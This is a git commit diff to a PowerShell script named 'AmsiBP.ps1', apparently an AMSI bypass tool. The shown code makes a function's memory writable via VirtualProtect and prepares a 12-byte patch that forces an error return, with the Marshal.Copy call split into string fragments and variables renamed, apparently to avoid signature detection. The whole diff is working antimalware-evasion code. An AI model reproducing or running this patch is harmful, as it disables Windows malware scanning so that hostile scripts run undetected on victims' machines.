81c341c3a2d542ffc15f2b2bfeaa38b2c7435cc9
YMBlueRS <147590626+YMBlueRS@users.noreply.github.com>
2024-11-11 23:35:00 +0100

    Update AmsiBP.ps1

--- AmsiBP.ps1
+++ AmsiBP.ps1
@@ -42,14 +42,15 @@ $params = @("msi", "S", "B", "ff");
 $oldProtectionBuffer = 0
 $vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
 $vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
-$input = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
+$buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)
 
+$in = $buf
 $zero = 0
 $pointer = $funcAddr
 $twelve = 12
 
 $a='[System.Runtime.InteropServices.Marshal]::Co'
-$b='py($input, $zero, $pointer, $twelve)'
+$b='py($in, $zero, $pointer, $twelve)'
 
 Sleep(4)
 
